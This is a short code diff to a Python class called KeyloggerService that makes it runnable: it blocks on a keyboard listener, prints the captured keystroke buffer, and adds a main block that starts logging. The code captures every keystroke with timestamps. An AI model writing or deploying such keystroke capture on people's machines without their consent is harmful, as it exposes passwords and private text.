@@ -17,6 +17,7 @@ class KeyloggerService(IKeylogger):
             self._is_logging = True
             self._listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
             self._listener.start()
+            self._listener.join()
 
     def stop_logging(self) -> None:
         if self._is_logging:
@@ -42,6 +43,7 @@ class KeyloggerService(IKeylogger):
             try:
                 char = key.char
                 self._buffer += char
+                print(self._buffer)
             except AttributeError:
                 if key == keyboard.Key.space:
                     self._buffer += " "
@@ -58,3 +60,7 @@ class KeyloggerService(IKeylogger):
     def _on_release(self, key):
         with self._lock:
             self._raw_events.append((datetime.now(), "release", str(key)))
+
+if __name__ == "__main__":
+    keylogger = KeyloggerService()
+    keylogger.start_logging()
